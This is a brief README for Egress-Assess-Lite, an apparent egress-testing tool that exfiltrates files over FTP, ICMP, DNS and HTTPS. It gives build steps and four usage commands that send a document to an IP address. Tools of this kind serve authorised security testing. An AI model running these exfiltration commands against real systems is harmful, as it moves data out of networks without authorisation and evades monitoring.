# Egress-Assess-Lite

Adapted from FortyNorthSecurity's [Egress-Assess](https://github.com/FortyNorthSecurity/Egress-Assess)

Specially made to be assess exfiltration in Windows systems.

Supported clients are:
* FTP
* ICMP
* HTTPS
* DNS

## Deployment

```powershell
pip install PyInstaller==3.6   # For python 2
pyinstaller --onefile Egress-Assess-Lite.py
```

## Usage

```powershell
./Egress-Assess-Lite.py --client ftp --username test --password ftp --ip 10.1.1.1 --file resume.docx
./Egress-Assess-Lite.py --client icmp --ip 10.1.1.1 --file resume.docx
./Egress-Assess-Lite.py --client dns --ip 10.1.1.1 --file resume.docx
./Egress-Assess-Lite.py --client https --ip 10.1.1.1 --file resume.docx
```